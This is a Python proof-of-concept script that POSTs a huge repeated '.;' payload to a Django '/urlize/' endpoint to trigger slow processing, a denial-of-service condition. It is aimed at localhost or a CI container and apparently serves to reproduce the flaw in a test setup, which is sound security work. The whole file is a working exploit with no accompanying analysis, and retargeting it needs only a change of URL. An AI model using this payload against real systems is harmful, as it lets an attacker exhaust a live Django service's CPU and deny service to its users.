import requests
import sys
from time import time

# Get the hostname from command line argument
IS_CI_RUN = sys.argv[1] if len(sys.argv) > 1 else "false"
if IS_CI_RUN == "true":
    url = 'http://django-app:8000/urlize/'
else:
    url = 'http://localhost:8000/urlize/'

# Construct the payload
payload = ".;" * (800000 if IS_CI_RUN == "true" else 200000) 
#payload="hello"
data = {
    "payload": payload
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Send the payload
start_time = time()
print(f"running exploit. url is {url}.")
response = requests.post(url, data=data,headers=headers)
end_time = time()

# Print the time taken and response status
elapsed_time = end_time - start_time
print(f"Processed urlize, took {elapsed_time:.2f} seconds.")
print(f"Response status code: {response.status_code}")
